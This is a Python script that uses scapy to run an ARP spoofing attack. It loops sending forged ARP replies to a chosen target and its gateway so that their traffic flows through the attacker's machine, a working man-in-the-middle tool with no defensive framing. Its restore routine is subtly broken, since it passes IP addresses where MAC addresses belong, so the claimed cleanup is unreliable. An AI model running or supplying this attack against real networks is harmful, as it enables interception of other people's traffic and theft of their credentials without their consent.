#!/usr/bin/env python

import scapy.all as scapy
import argparse
import sys


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target",
                        help="Insert the target")
    parser.add_argument("-g", "--gateway", dest="gateway",
                        help="Insert the gateway")
    # Parse the values
    (options) = parser.parse_args()
    if not options.target:
        parser.error("[-] Please insert a target to be spoofed")
    elif not options.gateway:
        parser.error("[-] Please insert the Gateway")
    else:
        return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    # Sending the packets to clients and receive response:
    answered_list = scapy.srp(arp_request_broadcast,
                              timeout=1, verbose=False)[0]
    # Just interested in one element, the MAC address from the target IP.
    answered_list[0][1].hwsrc
    return answered_list[0][1].hwsrc

# sending the packet message to the victim as if you are the router


def spoof(target_ip, spoof_ip):
    # spoof_ip - The ip we are pretending to be
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# Return the victim ARP table to its original


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,
                       hwdst=destination_ip, psrc=source_ip, hwsrc=source_ip)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
sent_packets_count = 0

try:
    while True:
        spoof(options.target, options.gateway)
        spoof(options.gateway, options.target)

        # printing every output with dynamic printing
        # \r "always print from the start of the line"
        print("\r[+] Packets count: " + str(sent_packets_count), end="")
        sent_packets_count += 2
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C.... Resetting ARP Tables...\n")
    restore(options.target, options.gateway)
    restore(options.gateway, options.target)
